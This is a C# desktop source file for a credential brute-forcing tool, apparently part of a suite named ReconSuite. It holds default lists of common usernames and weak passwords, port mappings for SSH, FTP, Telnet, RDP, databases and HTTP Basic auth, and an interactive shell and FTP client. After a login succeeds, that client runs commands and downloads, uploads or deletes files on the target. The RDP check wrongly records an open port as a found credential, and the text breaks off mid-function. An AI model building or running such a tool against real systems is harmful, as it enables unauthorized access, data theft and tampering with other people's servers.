using System;
using System.Collections.Generic;
using System.Collections.ObjectModel;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Threading;
using Microsoft.Win32;
using Renci.SshNet;
using Renci.SshNet.Common;
using MySql.Data.MySqlClient;
using Npgsql;

namespace ReconSuite
{
    public partial class BruteForcer : Window
    {
        public class BruteResult
        {
            public string Text { get; set; }
            public SolidColorBrush Color { get; set; }
        }

        public class FoundCredential
        {
            public string Service { get; set; }
            public string Username { get; set; }
            public string Password { get; set; }
            public string Target { get; set; }
            public int Port { get; set; }
            public string Timestamp { get; set; }
        }

        private ObservableCollection<BruteResult> bruteResults = new ObservableCollection<BruteResult>();
        private ObservableCollection<FoundCredential> foundCredentials = new ObservableCollection<FoundCredential>();
        private List<string> usernames = new List<string>();
        private List<string> passwords = new List<string>();
        private CancellationTokenSource cts;
        private bool isRunning = false;
        private DateTime startTime;
        private int totalAttempts = 0;
        private int successfulAttempts = 0;
        private int failedAttempts = 0;
        private int currentUsernameIndex = 0;
        private int currentPasswordIndex = 0;
        private DispatcherTimer statsTimer;
        private int threadSafeTotalAttempts = 0;
        private int threadSafeSuccessfulAttempts = 0;
        private int threadSafeFailedAttempts = 0;

        private SshClient activeSshClient;
        private ShellStream activeShellStream;
        private TcpClient activeTcpClient;
        private NetworkStream activeStream;
        private StreamReader activeStreamReader;
        private StreamWriter activeStreamWriter;

        private bool isConnected = false;
        private System.Timers.Timer outputReaderTimer;
        private string currentProtocol = "";
        private string currentTarget = "";
        private string currentUsername = "";
        private string currentPassword = "";
        private int currentPort = 0;

        private List<string> commandHistory = new List<string>();
        private int historyIndex = -1;
        private string currentDirectory = "/";
        private StringBuilder currentLine = new StringBuilder();
        private CancellationTokenSource ftpKeepAliveCts;
        private bool debugMode = true;

        public BruteForcer()
        {
            InitializeComponent();
            InitializeUI();
            LoadDefaultLists();
            ShellTargetInput.Text = TargetInput.Text;
        }

        private void InitializeUI()
        {
            statsTimer = new DispatcherTimer(DispatcherPriority.Background, Dispatcher);
            statsTimer.Interval = TimeSpan.FromSeconds(1);
            statsTimer.Tick += UpdateStats;
            statsTimer.Start();

            ProtocolCombo.SelectionChanged += ProtocolCombo_SelectionChanged;
            ShellProtocolCombo.SelectionChanged += ShellProtocolCombo_SelectionChanged;
            TargetInput.TextChanged += TargetInput_TextChanged;

            ShellInputBox.KeyDown += ShellInputBox_KeyDown;
            ShellInputBox.PreviewKeyDown += ShellInputBox_PreviewKeyDown;
        }

        private void ShellInputBox_PreviewKeyDown(object sender, KeyEventArgs e)
        {
            if (e.Key == Key.C && Keyboard.Modifiers == ModifierKeys.Control && currentProtocol == "SSH" && activeShellStream != null)
            {
                activeShellStream.Write("\x03");
                AppendToShell("^C\r\n");
                e.Handled = true;
            }
            else if (e.Key == Key.D && Keyboard.Modifiers == ModifierKeys.Control && currentProtocol == "SSH" && activeShellStream != null)
            {
                activeShellStream.Write("\x04");
                AppendToShell("^D\r\n");
                e.Handled = true;
            }
            else if (e.Key == Key.L && Keyboard.Modifiers == ModifierKeys.Control)
            {
                ShellOutputBox.Clear();
                e.Handled = true;
            }
        }

        private void TargetInput_TextChanged(object sender, TextChangedEventArgs e)
        {
            ShellTargetInput.Text = TargetInput.Text;
        }

        private void ShellProtocolCombo_SelectionChanged(object sender, SelectionChangedEventArgs e)
        {
            var protocol = ((ComboBoxItem)ShellProtocolCombo.SelectedItem)?.Content.ToString();
            if (protocol == "SSH") ShellPortInput.Text = "22";
            else if (protocol == "FTP") ShellPortInput.Text = "21";
            else if (protocol == "Telnet") ShellPortInput.Text = "23";
            else if (protocol == "MySQL") ShellPortInput.Text = "3306";
            else if (protocol == "HTTP") ShellPortInput.Text = "80";
            else if (protocol == "RDP") ShellPortInput.Text = "3389";
        }

        private void LoadDefaultLists()
        {
            usernames = new List<string>
            {
                "admin", "root", "user", "administrator", "test", "guest",
                "ftp", "anonymous", "sysadmin", "manager", "operator", "backup",
                "oracle", "postgres", "mysql", "sa", "tomcat", "jenkins", "docker",
                "demo"
            };

            passwords = new List<string>
            {
                "password", "admin", "123456", "password123", "admin123",
                "12345678", "qwerty", "123456789", "12345", "1234", "111111",
                "root", "toor", "pass", "pass123", "admin@123", "Admin123",
                "Welcome1", "Password1", "changeme", "letmein", "secret",
                "demo", ""
            };

            Dispatcher.Invoke(() => { UpdateCounts(); });
        }

        private void ProtocolCombo_SelectionChanged(object sender, SelectionChangedEventArgs e)
        {
            if (ProtocolCombo.SelectedIndex >= 0)
            {
                string selected = ((ComboBoxItem)ProtocolCombo.SelectedItem).Content.ToString();
                string port = GetPortFromProtocol(selected);
                if (!string.IsNullOrEmpty(port)) PortInput.Text = port;
            }
        }

        private string GetPortFromProtocol(string protocol)
        {
            var portMap = new Dictionary<string, string>
            {
                { "SSH (22)", "22" },
                { "FTP (21)", "21" },
                { "Telnet (23)", "23" },
                { "RDP (3389)", "3389" },
                { "MySQL (3306)", "3306" },
                { "PostgreSQL (5432)", "5432" },
                { "SMB (445)", "445" },
                { "VNC (5900)", "5900" },
                { "HTTP Basic Auth (80/443)", "80" }
            };
            return portMap.ContainsKey(protocol) ? portMap[protocol] : "";
        }

        private void UpdateCounts()
        {
            UsernameCountText.Text = usernames.Count.ToString();
            PasswordCountText.Text = passwords.Count.ToString();
            TotalAttemptsText.Text = (usernames.Count * passwords.Count).ToString();
        }

        private void UpdateStats(object sender, EventArgs e)
        {
            if (isRunning)
            {
                totalAttempts = threadSafeTotalAttempts;
                successfulAttempts = threadSafeSuccessfulAttempts;
                failedAttempts = threadSafeFailedAttempts;

                TimeSpan elapsed = DateTime.Now - startTime;
                ElapsedTimeText.Text = elapsed.ToString(@"hh\:mm\:ss");

                if (elapsed.TotalSeconds > 0)
                {
                    double attemptsPerSecond = totalAttempts / elapsed.TotalSeconds;
                    AttemptsPerSecondText.Text = attemptsPerSecond.ToString("F1");

                    int totalCombinations = usernames.Count * passwords.Count;
                    int remaining = totalCombinations - totalAttempts;
                    if (remaining > 0)
                    {
                        double secondsLeft = remaining / attemptsPerSecond;
                        TimeLeftText.Text = TimeSpan.FromSeconds(secondsLeft).ToString(@"hh\:mm\:ss");
                    }
                    else
                    {
                        TimeLeftText.Text = "00:00:00";
                    }
                }

                CredentialsFoundText.Text = successfulAttempts.ToString();
                FailedAttemptsText.Text = failedAttempts.ToString();
            }
        }

        private string StripAnsi(string input)
        {
            if (string.IsNullOrEmpty(input)) return input;

            input = Regex.Replace(input, @"\x1B\]\d+;.*?\\", "");
            input = Regex.Replace(input, @"\x1B\].*?\x07", "");
            input = Regex.Replace(input, @"\x1B\[[0-9;]*[a-zA-Z]", "");
            input = Regex.Replace(input, @"\x1B[\[\]\(][0-9;]*[a-zA-Z0-9]", "");
            input = Regex.Replace(input, @"\[\?2004[hl]", "");
            input = Regex.Replace(input, @"[\x00-\x08\x0B\x0C\x0E-\x1F\x7F]", "");

            return input;
        }

        private async void ConnectShellBtn_Click(object sender, RoutedEventArgs e)
        {
            if (isConnected)
            {
                AppendToShell("Already connected. Disconnect first.\r\n");
                return;
            }

            currentTarget = ShellTargetInput.Text.Trim();
            if (!int.TryParse(ShellPortInput.Text, out int port)) port = 21;
            currentUsername = ShellUsernameInput.Text.Trim();
            currentPassword = ShellPasswordInput.Text.Trim();
            string protocol = ((ComboBoxItem)ShellProtocolCombo.SelectedItem)?.Content.ToString() ?? "SSH";
            currentProtocol = protocol;
            currentPort = port;

            if (string.IsNullOrEmpty(currentTarget))
            {
                AppendToShell("Error: Target IP/domain is required\r\n");
                return;
            }

            AppendToShell($"Connecting to {currentTarget}:{port} via {protocol}...\r\n");

            try
            {
                bool connected = false;

                if (protocol == "SSH")
                {
                    connected = await ConnectSSH(currentTarget, port, currentUsername, currentPassword);
                }
                else if (protocol == "FTP")
                {
                    connected = await ConnectFTP(currentTarget, port, currentUsername, currentPassword);
                }
                else if (protocol == "Telnet")
                {
                    connected = await ConnectTelnet(currentTarget, port, currentUsername, currentPassword);
                }
                else if (protocol == "MySQL")
                {
                    connected = await ConnectMySQL(currentTarget, port, currentUsername, currentPassword);
                }
                else if (protocol == "HTTP")
                {
                    connected = await ConnectHTTP(currentTarget, port, currentUsername, currentPassword);
                }
                else if (protocol == "RDP")
                {
                    connected = await ConnectRDP(currentTarget, port, currentUsername, currentPassword);
                }

                if (connected)
                {
                    isConnected = true;
                    ConnectShellBtn.IsEnabled = false;
                    DisconnectShellBtn.IsEnabled = true;
                    ShellInputBox.IsEnabled = true;
                    SendCommandBtn.IsEnabled = true;
                    ShellInputBox.Focus();

                    AppendToShell($"✓ Connected successfully to {currentTarget}:{port}\r\n");

                    if (protocol == "FTP")
                    {
                        AppendToShell("FTP commands: ls, cd, pwd, get, put, cat, delete, mkdir, rmdir, rename, quit\r\n");
                        AppendToShell("Type 'help' for more info\r\n");

                        string pwdResult = await SendFTPCommand("PWD");
                        Match match = Regex.Match(pwdResult, "\"(.*?)\"");
                        if (match.Success)
                        {
                            currentDirectory = match.Groups[1].Value;
                        }

                        ftpKeepAliveCts = new CancellationTokenSource();
                        _ = StartFTPKeepAlive(ftpKeepAliveCts.Token);
                    }
                    else if (protocol == "SSH")
                    {
                        AppendToShell("SSH shell - type commands directly\r\n");
                        AppendToShell("Ctrl+C to interrupt, Ctrl+D to exit\r\n");
                    }

                    AppendToShell("----------------------------------------\r\n");
                }
                else
                {
                    AppendToShell($"✗ Connection failed - invalid credentials or service not available\r\n");
                    Disconnect();
                }
            }
            catch (Exception ex)
            {
                AppendToShell($"✗ Connection error: {ex.Message}\r\n");
                Disconnect();
            }
        }

        private void AppendToShell(string text, bool isDebug = false)
        {
            Dispatcher.Invoke(() =>
            {
                if (isDebug && !debugMode) return;
                ShellOutputBox.AppendText(text);
                ShellOutputBox.ScrollToEnd();
            });
        }

        private async Task<bool> ConnectSSH(string target, int port, string username, string password)
        {
            try
            {
                var connectionInfo = new ConnectionInfo(target, port, username,
                    new AuthenticationMethod[] { new PasswordAuthenticationMethod(username, password) })
                {
                    Timeout = TimeSpan.FromSeconds(10)
                };

                activeSshClient = new SshClient(connectionInfo);
                await Task.Run(() => activeSshClient.Connect());

                if (activeSshClient.IsConnected)
                {
                    activeShellStream = activeSshClient.CreateShellStream("xterm", 120, 40, 800, 600, 4096);
                    await Task.Delay(1000);

                    if (activeShellStream.Length > 0)
                    {
                        activeShellStream.Read();
                    }

                    StartSSHReader();
                    return true;
                }
            }
            catch (Exception ex)
            {
                AppendToShell($"SSH detail: {ex.Message}\r\n");
            }
            return false;
        }

        private async Task<bool> ConnectFTP(string target, int port, string username, string password)
        {
            try
            {
                activeTcpClient = new TcpClient();
                await activeTcpClient.ConnectAsync(target, port);

                activeStream = activeTcpClient.GetStream();
                activeStreamReader = new StreamReader(activeStream, Encoding.ASCII);
                activeStreamWriter = new StreamWriter(activeStream, Encoding.ASCII) { AutoFlush = true, NewLine = "\r\n" };

                string response = await ReadFTPResponse(10000);
                AppendToShell(response);

                await activeStreamWriter.WriteLineAsync($"USER {username}");
                response = await ReadFTPResponse();
                AppendToShell(response);

                if (response.StartsWith("331"))
                {
                    await activeStreamWriter.WriteLineAsync($"PASS {password}");
                    response = await ReadFTPResponse();
                    AppendToShell(response);

                    if (!response.StartsWith("230") && !response.StartsWith("202"))
                    {
                        return false;
                    }
                }
                else if (response.StartsWith("230"))
                {
                }
                else
                {
                    return false;
                }

                await SendFTPCommand("TYPE I");

                return true;
            }
            catch (Exception ex)
            {
                AppendToShell($"FTP detail: {ex.Message}\r\n");
                return false;
            }
        }

        private async Task<string> ReadFTPResponse(int timeoutMs = 5000)
        {
            StringBuilder response = new StringBuilder();
            string line;
            bool isMultiline = false;
            string lastCode = "";
            var startTime = DateTime.Now;

            while ((DateTime.Now - startTime).TotalMilliseconds < timeoutMs)
            {
                if (activeStreamReader != null && activeStreamReader.Peek() >= 0)
                {
                    line = await activeStreamReader.ReadLineAsync();
                    if (line == null) break;

                    response.AppendLine(line);

                    if (line.Length >= 4)
                    {
                        string code = line.Substring(0, 3);
                        char separator = line[3];

                        if (Regex.IsMatch(code, @"^\d{3}$"))
                        {
                            if (separator == '-')
                            {
                                isMultiline = true;
                                lastCode = code;
                            }
                            else if (separator == ' ')
                            {
                                if (isMultiline && code == lastCode)
                                {
                                    break;
                                }
                                else if (!isMultiline)
                                {
                                    break;
                                }
                            }
                        }
                    }
                }
                await Task.Delay(10);
            }

            return response.ToString();
        }

        private async Task<string> SendFTPCommand(string command)
        {
            if (activeStreamWriter == null) return "Not connected";

            await activeStreamWriter.WriteLineAsync(command);
            await Task.Delay(50);
            return await ReadFTPResponse();
        }

        private async Task<(TcpClient dataClient, string ip, int port)> SetupDataConnection()
        {
            if (activeStreamWriter == null) throw new Exception("Not connected");

            await activeStreamWriter.WriteLineAsync("PASV");

            string pasvResponse = await ReadFTPResponse(10000);

            AppendToShell($"[DEBUG] PASV response: {pasvResponse.Trim()}\r\n", true);

            Match match = null;

            match = Regex.Match(pasvResponse, @"\((\d+),(\d+),(\d+),(\d+),(\d+),(\d+)\)");

            if (!match.Success)
            {
                match = Regex.Match(pasvResponse, @"(\d+),(\d+),(\d+),(\d+),(\d+),(\d+)");
            }

            if (!match.Success)
            {
                throw new Exception($"Failed to parse PASV response: {pasvResponse.Trim()}");
            }

            string ip = $"{match.Groups[1]}.{match.Groups[2]}.{match.Groups[3]}.{match.Groups[4]}";
            int dataPort = (int.Parse(match.Groups[5].Value) * 256) + int.Parse(match.Groups[6].Value);

            AppendToShell($"[DEBUG] Data connection to {ip}:{dataPort}\r\n", true);

            var dataClient = new TcpClient();
            await dataClient.ConnectAsync(ip, dataPort);

            await Task.Delay(200);

            return (dataClient, ip, dataPort);
        }

        private async Task StartFTPKeepAlive(CancellationToken token)
        {
            while (isConnected && currentProtocol == "FTP" && !token.IsCancellationRequested)
            {
                await Task.Delay(30000, token);
                if (isConnected)
                {
                    try
                    {
                        await SendFTPCommand("NOOP");
                    }
                    catch
                    {
                        AppendToShell("FTP connection lost\r\n");
                        Disconnect();
                        break;
                    }
                }
            }
        }

        private async Task<bool> ConnectTelnet(string target, int port, string username, string password)
        {
            try
            {
                activeTcpClient = new TcpClient();
                await activeTcpClient.ConnectAsync(target, port);

                activeStream = activeTcpClient.GetStream();
                activeStreamReader = new StreamReader(activeStream, Encoding.ASCII);
                activeStreamWriter = new StreamWriter(activeStream, Encoding.ASCII) { AutoFlush = true, NewLine = "\r\n" };

                string response = await ReadTelnetResponse(3000);
                AppendToShell(StripAnsi(response));

                if (response.Contains("login:") || response.Contains("Login:"))
                {
                    await activeStreamWriter.WriteLineAsync(username);
                    await Task.Delay(500);

                    response = await ReadTelnetResponse(3000);
                    AppendToShell(StripAnsi(response));

                    if (response.Contains("password:") || response.Contains("Password:"))
                    {
                        await activeStreamWriter.WriteLineAsync(password);
                        await Task.Delay(1000);

                        response = await ReadTelnetResponse(3000);
                        AppendToShell(StripAnsi(response));

                        if (!response.Contains("Login incorrect") && !response.Contains("Authentication failed"))
                        {
                            StartTelnetReader();
                            return true;
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                AppendToShell($"Telnet detail: {ex.Message}\r\n");
            }
            return false;
        }

        private async Task<string> ReadTelnetResponse(int timeout)
        {
            var buffer = new StringBuilder();
            var startTime = DateTime.Now;

            while ((DateTime.Now - startTime).TotalMilliseconds < timeout && activeTcpClient != null && activeTcpClient.Connected)
            {
                if (activeStreamReader != null && activeStreamReader.Peek() >= 0)
                {
                    char c = (char)activeStreamReader.Read();
                    buffer.Append(c);
                }
                await Task.Delay(10);
            }

            return buffer.ToString();
        }

        private async Task<bool> ConnectMySQL(string target, int port, string username, string password)
        {
            try
            {
                string connStr = $"Server={target};Port={port};Uid={username};Pwd={password};Connection Timeout=5;";
                using (var connection = new MySqlConnection(connStr))
                {
                    await connection.OpenAsync();
                    if (connection.State == System.Data.ConnectionState.Open)
                    {
                        AppendToShell("✓ MySQL connection successful\r\n");
                        return true;
                    }
                }
            }
            catch (Exception ex)
            {
                AppendToShell($"MySQL detail: {ex.Message}\r\n");
            }
            return false;
        }

        private async Task<bool> ConnectHTTP(string target, int port, string username, string password)
        {
            try
            {
                string protocol = port == 443 ? "https" : "http";
                string url = $"{protocol}://{target}:{port}/";

                var request = (HttpWebRequest)WebRequest.Create(url);
                request.Method = "HEAD";

                if (!string.IsNullOrEmpty(username) && !string.IsNullOrEmpty(password))
                {
                    string auth = Convert.ToBase64String(Encoding.ASCII.GetBytes($"{username}:{password}"));
                    request.Headers["Authorization"] = "Basic " + auth;
                }

                request.Timeout = 5000;

                using (var response = (HttpWebResponse)await request.GetResponseAsync())
                {
                    if (response.StatusCode == HttpStatusCode.OK)
                    {
                        AppendToShell($"✓ HTTP connection successful\r\n");
                        return true;
                    }
                }
            }
            catch (WebException ex)
            {
                var response = ex.Response as HttpWebResponse;
                if (response != null && response.StatusCode == HttpStatusCode.Unauthorized)
                {
                    AppendToShell("✗ HTTP authentication failed\r\n");
                }
                else
                {
                    AppendToShell($"HTTP error: {ex.Message}\r\n");
                }
            }
            catch (Exception ex)
            {
                AppendToShell($"HTTP detail: {ex.Message}\r\n");
            }
            return false;
        }

        private async Task<bool> ConnectRDP(string target, int port, string username, string password)
        {
            try
            {
                using (var client = new TcpClient())
                {
                    var connectTask = client.ConnectAsync(target, port);
                    if (await Task.WhenAny(connectTask, Task.Delay(5000)) == connectTask && client.Connected)
                    {
                        AppendToShell($"✓ RDP port {port} is open\r\n");

                        var cred = new FoundCredential
                        {
                            Service = "RDP",
                            Username = username,
                            Password = password,
                            Target = target,
                            Port = port,
                            Timestamp = DateTime.Now.ToString("HH:mm:ss")
                        };

                        Dispatcher.Invoke(() => AddCredentialToUI(cred));
                        return true;
                    }
                    else
                    {
                        AppendToShell($"✗ RDP port {port} is closed or filtered\r\n");
                    }
                }
            }
            catch (Exception ex)
            {
                AppendToShell($"RDP detail: {ex.Message}\r\n");
            }
            return false;
        }

        private void StartSSHReader()
        {
            outputReaderTimer = new System.Timers.Timer(50);
            outputReaderTimer.Elapsed += (s, e) =>
            {
                try
                {
                    if (activeShellStream != null && activeShellStream.CanRead && activeShellStream.Length > 0)
                    {
                        string output = activeShellStream.Read();
                        if (!string.IsNullOrEmpty(output))
                        {
                            string cleanOutput = StripAnsi(output);
                            if (!string.IsNullOrWhiteSpace(cleanOutput))
                            {
                                Dispatcher.Invoke(() =>
                                {
                                    ShellOutputBox.AppendText(cleanOutput);
                                    ShellOutputBox.ScrollToEnd();
                                });
                            }
                        }
                    }
                }
                catch { }
            };
            outputReaderTimer.Start();
        }

        private void StartTelnetReader()
        {
            outputReaderTimer = new System.Timers.Timer(50);
            outputReaderTimer.Elapsed += (s, e) =>
            {
                try
                {
                    if (activeTcpClient != null && activeTcpClient.Connected && activeStreamReader != null)
                    {
                        while (activeStreamReader.Peek() >= 0)
                        {
                            char c = (char)activeStreamReader.Read();
                            Dispatcher.Invoke(() =>
                            {
                                ShellOutputBox.AppendText(c.ToString());
                                ShellOutputBox.ScrollToEnd();
                            });
                        }
                    }
                }
                catch { }
            };
            outputReaderTimer.Start();
        }

        private async void SendCommandBtn_Click(object sender, RoutedEventArgs e)
        {
            await SendCommand();
        }

        private async void ShellInputBox_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.Key == Key.Enter)
            {
                await SendCommand();
                e.Handled = true;
            }
            else if (e.Key == Key.Up)
            {
                if (commandHistory.Count > 0)
                {
                    if (historyIndex < 0) historyIndex = commandHistory.Count - 1;
                    else if (historyIndex > 0) historyIndex--;

                    ShellInputBox.Text = commandHistory[historyIndex];
                    ShellInputBox.CaretIndex = ShellInputBox.Text.Length;
                }
                e.Handled = true;
            }
            else if (e.Key == Key.Down)
            {
                if (commandHistory.Count > 0 && historyIndex >= 0)
                {
                    historyIndex++;
                    if (historyIndex >= commandHistory.Count)
                    {
                        historyIndex = commandHistory.Count;
                        ShellInputBox.Text = "";
                    }
                    else
                    {
                        ShellInputBox.Text = commandHistory[historyIndex];
                        ShellInputBox.CaretIndex = ShellInputBox.Text.Length;
                    }
                }
                e.Handled = true;
            }
        }

        private async Task SendCommand()
        {
            if (!isConnected)
            {
                AppendToShell("Not connected. Click CONNECT first.\r\n");
                return;
            }

            string command = ShellInputBox.Text.Trim();
            if (string.IsNullOrEmpty(command)) return;

            commandHistory.Add(command);
            historyIndex = commandHistory.Count;
            ShellInputBox.Clear();

            try
            {
                if (currentProtocol == "SSH" && activeShellStream != null)
                {
                    if (command.StartsWith("cat "))
                    {
                        AppendToShell($"$ {command}\r\n");
                        using (var cmd = activeSshClient.CreateCommand(command))
                        {
                            string result = cmd.Execute();
                            if (!string.IsNullOrEmpty(result))
                            {
                                AppendToShell(result);
                                if (!result.EndsWith("\n") && !result.EndsWith("\r\n"))
                                    AppendToShell("\r\n");
                            }
                            else if (!string.IsNullOrEmpty(cmd.Error))
                            {
                                AppendToShell(cmd.Error);
                                if (!cmd.Error.EndsWith("\n") && !cmd.Error.EndsWith("\r\n"))
                                    AppendToShell("\r\n");
                            }
                        }
                        AppendToShell($"\r\n");
                    }
                    else
                    {
                        activeShellStream.WriteLine(command);
                    }
                }
                else if (currentProtocol == "FTP" && activeStreamWriter != null)
                {
                    await ExecuteFTPCommand(command);
                }
                else if (currentProtocol == "Telnet" && activeStreamWriter != null)
                {
                    await activeStreamWriter.WriteLineAsync(command);
                }
                else
                {
                    AppendToShell($"Command not supported for {currentProtocol}\r\n");
                }
            }
            catch (Exception ex)
            {
                AppendToShell($"Command failed: {ex.Message}\r\n");

                if (ex.Message.Contains("connection") || ex.Message.Contains("socket") || ex.Message.Contains("stream"))
                {
                    AppendToShell("Attempting to reconnect...\r\n");
                    Disconnect();

                    if (currentProtocol == "FTP")
                    {
                        await ConnectFTP(currentTarget, currentPort, currentUsername, currentPassword);
                    }
                    else if (currentProtocol == "Telnet")
                    {
                        await ConnectTelnet(currentTarget, currentPort, currentUsername, currentPassword);
                    }
                }
            }
        }

        private async Task ExecuteFTPCommand(string command)
        {
            string[] parts = command.Split(new[] { ' ' }, StringSplitOptions.RemoveEmptyEntries);
            if (parts.Length == 0) return;

            string cmd = parts[0].ToLower();

            switch (cmd)
            {
                case "ls":
                case "dir":
                    await ListFTPDirectory();
                    break;

                case "cat":
                    if (parts.Length > 1)
                    {
                        string filename = string.Join(" ", parts.Skip(1));
                        await CatFTPFile(filename);
                    }
                    else
                    {
                        AppendToShell("Usage: cat <filename>\r\n");
                    }
                    break;

                case "cd":
                    if (parts.Length > 1)
                    {
                        string dir = string.Join(" ", parts.Skip(1));
                        string response = await SendFTPCommand($"CWD {dir}");
                        AppendToShell(response);

                        await Task.Delay(100);

                        string pwdResult = await SendFTPCommand("PWD");
                        Match match = Regex.Match(pwdResult, "\"(.*?)\"");
                        if (match.Success)
                        {
                            currentDirectory = match.Groups[1].Value;
                        }
                    }
                    else
                    {
                        AppendToShell("Usage: cd <directory>\r\n");
                    }
                    break;

                case "pwd":
                    string pwdResult2 = await SendFTPCommand("PWD");
                    AppendToShell(pwdResult2);
                    break;

                case "get":
                    if (parts.Length > 1)
                    {
                        string filename = string.Join(" ", parts.Skip(1));
                        await DownloadFTPFile(filename);
                    }
                    else
                    {
                        AppendToShell("Usage: get <filename>\r\n");
                    }
                    break;

                case "put":
                    if (parts.Length > 1)
                    {
                        string filename = string.Join(" ", parts.Skip(1));
                        await UploadFTPFile(filename);
                    }
                    else
                    {
                        AppendToShell("Usage: put <filename>\r\n");
                    }
                    break;

                case "delete":
                case "rm":
                    if (parts.Length > 1)
                    {
                        string filename = string.Join(" ", parts.Skip(1));
                        string response = await SendFTPCommand($"DELE {filename}");
                        AppendToShell(response);
                    }
                    else
                    {
                        AppendToShell("Usage: delete <filename>\r\n");
                    }
                    break;

                case "mkdir":
                    if (parts.Length > 1)
                    {
                        string dir = string.Join(" ", parts.Skip(1));
                        string response = await SendFTPCommand($"MKD {dir}");
                        AppendToShell(response);
                    }
                    else
                    {
                        AppendToShell("Usage: mkdir <directory>\r\n");
                    }
                    break;

                case "rmdir":
                    if (parts.Length > 1)
                    {
                        string dir = string.Join(" ", parts.Skip(1));
                        string response = await SendFTPCommand($"RMD {dir}");
                        AppendToShell(response);
                    }
                    else
                    {
                        AppendToShell("Usage: rmdir <directory>\r\n");
                    }
                    break;

                case "rename":
                    if (parts.Length > 2)
                    {
                        string oldName = parts[1];
                        string newName = parts[2];
                        string response = await SendFTPCommand($"RNFR {oldName}");
                        if (response.StartsWith("350"))
                        {
                            await Task.Delay(100);
                            response = await SendFTPCommand($"RNTO {newName}");
                        }
                        AppendToShell(response);
                    }
                    else
                    {
                        AppendToShell("Usage: rename <oldname> <newname>\r\n");
                    }
                    break;

                case "quit":
                case "exit":
                    await SendFTPCommand("QUIT");
                    Disconnect();
                    break;

                case "help":
                    AppendToShell("Available FTP commands:\r\n");
                    AppendToShell("  ls, dir           - List files\r\n");
                    AppendToShell("  cat <file>        - View file contents\r\n");
                    AppendToShell("  cd <dir>          - Change directory\r\n");
                    AppendToShell("  pwd               - Print working directory\r\n");
                    AppendToShell("  get <file>        - Download file\r\n");
                    AppendToShell("  put <file>        - Upload file\r\n");
                    AppendToShell("  delete <file>     - Delete file\r\n");
                    AppendToShell("  mkdir <dir>       - Create directory\r\n");
                    AppendToShell("  rmdir <dir>       - Remove directory\r\n");
                    AppendToShell("  rename <old> <new> - Rename file\r\n");
                    AppendToShell("  quit, exit        - Disconnect\r\n");
                    break;

                default:
                    string rawResponse = await SendFTPCommand(command);
                    AppendToShell(rawResponse);
                    break;
            }
        }

        private async Task ListFTPDirectory()
        {
            TcpClient dataClient = null;
            try
            {
                (dataClient, string ip, int dataPort) = await SetupDataConnection();

                await activeStreamWriter.WriteLineAsync("LIST");

                await Task.Delay(200);

                if (activeStreamReader.Peek() >= 0)
                {
                    string interimResponse = await ReadFTPResponse(1000);
                    if (interimResponse.Contains("550") || interimResponse.Contains("450"))
                    {
                        AppendToShell($"Error: {interimResponse.Trim()}\r\n");
                        dataClient.Close();
                        return;
                    }
                }

                using (dataClient)
                using (var dataStream = dataClient.GetStream())
                using (var dataReader = new StreamReader(dataStream, Encoding.ASCII))
                {
                    dataStream.ReadTimeout = 10000;
                    string line;
                    while ((line = await dataReader.ReadLineAsync()) != null)
                    {
                        AppendToShell(line + "\r\n");
                    }
                }

                string finalResponse = await ReadFTPResponse();
                if (!string.IsNullOrWhiteSpace(finalResponse))
                {
                    AppendToShell(finalResponse);
                }
            }
            catch (Exception ex)
            {
                AppendToShell($"Error listing directory: {ex.Message}\r\n");
            }
            finally
            {
                dataClient?.Close();
            }
        }

        private async Task CatFTPFile(string filename)
        {
            TcpClient dataClient = null;
            try
            {
                (dataClient, string ip, int dataPort) = await SetupDataConnection();

                await activeStreamWriter.WriteLineAsync($"RETR {filename}");

                await Task.Delay(200);

                if (activeStreamReader.Peek() >= 0)
                {
                    string interimResponse = await ReadFTPResponse(1000);
                    if (interimResponse.Contains("550") || interimResponse.Contains("450"))
                    {
                        AppendToShell($"Error: {interimResponse.Trim()}\r\n");
                        dataClient.Close();
                        return;
                    }
                }

                AppendToShell($"--- Contents of {filename} ---\r\n");

                using (dataClient)
                using (var dataStream = dataClient.GetStream())
                using (var dataReader = new StreamReader(dataStream, Encoding.ASCII))
                {
                    dataStream.ReadTimeout = 10000;
                    string line;
                    while ((line = await dataReader.ReadLineAsync()) != null)
                    {
                        AppendToShell(line + "\r\n");
                    }
                }

                AppendToShell($"--- End of {filename} ---\r\n");

                string finalResponse = await ReadFTPResponse();
                if (!string.IsNullOrWhiteSpace(finalResponse))
                {
                    AppendToShell(finalResponse);
                }
            }
            catch (Exception ex)
            {
                AppendToShell($"Error reading file: {ex.Message}\r\n");
            }
            finally
            {
                dataClient?.Close();
            }
        }

        private async Task DownloadFTPFile(string filename)
        {
            var saveDialog = new SaveFileDialog
            {
                FileName = Path.GetFileName(filename),
                Filter = "All Files|*.*"
            };

            if (saveDialog.ShowDialog() == true)
            {
                TcpClient dataClient = null;
                try
                {
                    (dataClient, string ip, int dataPort) = await SetupDataConnection();

                    await activeStreamWriter.WriteLineAsync($"RETR {filename}");

                    await Task.Delay(200);

                    if (activeStreamReader.Peek() >= 0)
                    {
                        string interimResponse = await ReadFTPResponse(1000);
                        if (interimResponse.Contains("550") || interimResponse.Contains("450"))
                        {
                            AppendToShell($"Error: {interimResponse.Trim()}\r\n");
                            dataClient.Close();
                            return;
                        }
                    }

                    using (dataClient)
                    using (var dataStream = dataClient.GetStream())
                    using (var fileStream = File.Create(saveDialog.FileName))
                    {
                        dataStream.ReadTimeout = 30000;
                        await dataStream.CopyToAsync(fileStream);
                    }

                    string response = await ReadFTPResponse();
                    AppendToShell($"✓ Downloaded: {filename} to {saveDialog.FileName}\r\n");
                }
                catch (Exception ex)
                {
                    AppendToShell($"✗ Download failed: {ex.Message}\r\n");
                }
                finally
                {
                    dataClient?.Close();
                }
            }
        }

        private async Task UploadFTPFile(string filename)
        {
            var openDialog = new OpenFileDialog
            {
                FileName = filename,
                Filter = "All Files|*.*"
            };

            if (openDialog.ShowDialog() == true)
            {
                TcpClient dataClient = null;
                try
                {
                    (dataClient, string ip, int dataPort) = await SetupDataConnection();

                    string remoteFilename = Path.GetFileName(openDialog.FileName);
                    await activeStreamWriter.WriteLineAsync($"STOR {remoteFilename}");

                    await Task.Delay(200);

                    if (activeStreamReader.Peek() >= 0)
                    {
                        string interimResponse = await ReadFTPResponse(1000);
                        if (interimResponse.Contains("550") || interimResponse.Contains("450"))
                        {
